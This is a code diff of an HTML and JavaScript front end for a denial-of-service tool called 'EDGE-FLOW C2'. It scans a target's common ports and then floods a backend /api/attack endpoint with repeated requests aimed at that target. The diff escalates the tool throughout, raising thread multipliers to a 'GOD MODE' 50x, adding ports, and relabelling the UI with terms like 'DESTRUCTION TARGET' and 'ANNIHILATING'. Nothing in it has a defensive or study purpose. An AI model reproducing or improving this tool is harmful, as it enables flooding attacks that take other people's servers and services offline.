@@ -2,51 +2,52 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🔥 EDGE-FLOW UNLOCKED</title>
+    <title>☢️ EDGE-FLOW TOTAL ANNIHILATION</title>
     <style>
         :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); display: flex; justify-content: space-between; }
+        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); display: flex; justify-content: space-between; align-items: center; }
         .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
         .full-width { grid-column: span 2; }
         label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
         input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
         .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1.1em; }
-        #startBtn { background: var(--neon); color: #000; }
+        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1.2em; text-transform: uppercase; }
+        #startBtn { background: var(--neon); color: #000; box-shadow: 0 0 15px rgba(0, 255, 65, 0.3); }
         #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
-        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; }
+        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 11px; border-radius: 5px; box-shadow: inset 0 0 15px #000; }
         .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; }
-        .log-scan { color: var(--scan); border-left-color: var(--scan); }
         .log-err { color: var(--warn); border-left-color: var(--warn); }
+        .log-scan { color: var(--scan); border-left-color: var(--scan); }
+        .stats { font-size: 0.9em; color: #888; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>[ EDGE-FLOW C2 v5.5 - UNLOCKED ]</h1>
-        <div style="text-align: right;">
-            STATUS: <span id="statusText" style="color:var(--neon)">READY</span> | 
-            LOAD: <span id="shotCount">0</span> PKTS
+        <h1>[ EDGE-FLOW C2 v6.0 - NO LIMITS ]</h1>
+        <div class="stats">
+            STATUS: <span id="statusText">READY</span> | 
+            PAYLOAD: <span id="shotCount">0</span>
         </div>
     </div>
 
     <div class="controls">
         <div class="full-width">
-            <label>TARGET URL / IP</label>
+            <label>TARGET IP / URL (DESTRUCTION TARGET)</label>
             <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
         </div>
         <div>
-            <label>FIRE RATE (ms)</label>
+            <label>FIRE INTERVAL (ms)</label>
             <select id="rate">
-                <option value="100">Turbo (100ms)</option>
-                <option value="50" selected>INSANE (50ms)</option>
+                <option value="50" selected>MAX OVERLOAD (50ms)</option>
+                <option value="100">TURBO (100ms)</option>
             </select>
         </div>
         <div>
-            <label>POWER (THREADS)</label>
+            <label>THREAD MULTIPLIER</label>
             <select id="threads">
-                <option value="10">Standard (10x)</option>
-                <option value="30" selected>Overload (30x)</option>
+                <option value="50" selected>GOD MODE (50x)</option>
+                <option value="20">HIGH (20x)</option>
             </select>
         </div>
     </div>
@@ -56,12 +57,12 @@
         <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
     </div>
 
-    <div id="terminal">>> SYSTEM UNLOCKED. READY FOR BOMBARDMENT.</div>
+    <div id="terminal">>> SYSTEM UNLOCKED. WAITING FOR TARGET INPUT...</div>
 
     <script>
         let attackInterval = null;
         let totalShots = 0;
-        const commonPorts = [80, 443, 8080, 1900, 8888];
+        const commonPorts = [80, 443, 8080, 1900, 5000, 8888];
 
         function log(msg, type = 'info') {
             const term = document.getElementById('terminal');
@@ -69,59 +70,68 @@
             div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : ''}`;
             div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             term.prepend(div);
+            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
         }
 
         async function initiate() {
             const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("INVALID TARGET", "error"); return; }
+            if (!target.startsWith('http')) { log("CRITICAL ERROR: INVALID TARGET", "error"); return; }
 
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('startBtn').style.opacity = "0.5";
-            document.getElementById('stopBtn').disabled = false;
-            document.getElementById('stopBtn').style.opacity = "1";
-            document.getElementById('statusText').innerText = "FIRING";
-            document.getElementById('statusText').style.color = "red";
+            toggleButtons(true);
+            log(`🔍 INITIATING RAPID RECONNAISSANCE ON ${target}...`, "scan");
 
-            log("🔍 SCANNING TARGET PORTS...", "scan");
-            
-            // 포트 응답 확인 후 바로 타격 시작
-            let activePorts = [];
+            let openPorts = [];
             await Promise.all(commonPorts.map(async (port) => {
                 try {
                     const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 1000);
+                    setTimeout(() => controller.abort(), 1200);
                     await fetch(`${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
-                    activePorts.push(port);
-                    log(`[FOUND] PORT ${port} OPEN`, "scan");
+                    log(`[TARGET ACQUIRED] PORT ${port} IS OPEN`, "scan");
+                    openPorts.push(port);
                 } catch(e) {}
             }));
 
-            if (activePorts.length === 0) activePorts.push(80);
-            
-            startFiring(target, activePorts);
+            if (openPorts.length === 0) {
+                log("NO SPECIFIC PORTS RESPONDING. FORCING DEFAULT HTTP.", "error");
+                openPorts.push(80);
+            }
+
+            beginBombardment(target, openPorts);
         }
 
-        function startFiring(base, ports) {
+        function beginBombardment(base, ports) {
             const rate = parseInt(document.getElementById('rate').value);
             const threads = parseInt(document.getElementById('threads').value);
+            
+            document.getElementById('statusText').innerText = "ANNIHILATING";
+            document.getElementById('statusText').style.color = "red";
+            log(`🔥 TOTAL WAR DECLARED. FIRING ON PORTS: ${ports.join(", ")}`);
 
             attackInterval = setInterval(() => {
                 ports.forEach(port => {
-                    for(let i=0; i<threads; i++) {
-                        fetch(`/api/attack?target=${encodeURIComponent(base + ":" + port)}&cb=${Math.random()}`)
-                        .then(() => {
-                            totalShots += 1000;
-                            document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                            log(`HIT -> ${port}`);
-                        }).catch(() => {});
+                    for(let i=0; i < threads; i++) {
+                        // v6.0 서버 엔진 호출 (무거운 POST 패킷 전송)
+                        fetch(`/api/attack?target=${encodeURIComponent(base + ":" + port)}&v=6&cb=${Math.random()}`)
+                            .then(() => {
+                                totalShots += 15000; // 서버 로직에 맞춰 카운트 보정
+                                document.getElementById('shotCount').innerText = totalShots.toLocaleString();
+                                log(`DIRECT HIT -> PORT ${port}`);
+                            }).catch(() => {});
                     }
                 });
             }, rate);
         }
 
+        function toggleButtons(running) {
+            document.getElementById('startBtn').disabled = running;
+            document.getElementById('startBtn').style.opacity = running ? "0.5" : "1";
+            document.getElementById('stopBtn').disabled = !running;
+            document.getElementById('stopBtn').style.opacity = running ? "1" : "0.5";
+        }
+
         function terminate() {
             clearInterval(attackInterval);
-            location.reload(); // 시스템 완전 초기화
+            location.reload(); 
         }
     </script>
 </body>
